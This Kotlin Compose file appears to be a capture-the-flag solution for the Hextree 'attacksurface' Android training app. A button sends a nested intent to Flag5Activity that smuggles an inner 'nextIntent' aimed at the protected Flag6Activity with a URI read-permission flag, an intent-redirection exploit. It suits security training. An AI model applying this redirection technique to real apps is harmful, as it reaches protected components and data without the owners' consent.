package com.example.myapplication

import android.app.PendingIntent
import android.content.ComponentName
import android.content.Intent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext

@Composable
fun SendIntentToGetFlag6(modifier: Modifier = Modifier) {
    val context = LocalContext.current

    Column(
        modifier = Modifier.fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Button(onClick = {

            val flag6Intent = Intent().apply {
                component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag6Activity"
                )
                putExtra("reason", "next")
                flags = Intent.FLAG_GRANT_READ_URI_PERMISSION  
            }

            val innerIntent = Intent().apply {
                putExtra("return", 42)
                putExtra("nextIntent", flag6Intent)
            }

            val outerIntent = Intent().apply {
                component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag5Activity"
                )
                putExtra("android.intent.extra.INTENT", innerIntent)
            }

            context.startActivity(outerIntent)
        }){
            Text("Get Flag 5 -> Flag 6")

        }
    }
}